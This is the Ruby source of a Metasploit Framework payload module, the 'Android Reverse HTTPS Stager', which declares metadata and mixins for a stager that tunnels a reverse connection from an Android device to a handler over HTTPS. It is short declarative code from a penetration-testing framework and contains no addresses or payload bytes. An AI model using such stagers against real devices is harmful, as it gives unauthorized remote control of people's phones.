##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/handler/reverse_https'
require 'msf/core/payload/android/reverse_https'
require 'msf/core/payload/uuid/options'

module MetasploitModule

  CachedSize = :dynamic

  include Msf::Payload::Stager
  include Msf::Payload::Android
  include Msf::Payload::Android::ReverseHttps

  def initialize(info = {})
    super(merge_info(info,
      'Name'        => 'Android Reverse HTTPS Stager',
      'Description' => 'Tunnel communication over HTTPS',
      'Author'      => ['anwarelmakrahy', 'OJ Reeves'],
      'License'     => MSF_LICENSE,
      'Platform'    => 'android',
      'Arch'        => ARCH_DALVIK,
      'Handler'     => Msf::Handler::ReverseHttps,
      'Convention'  => 'javaurl',
      'Stager'      => {'Payload' => ''}
    ))
  end
end
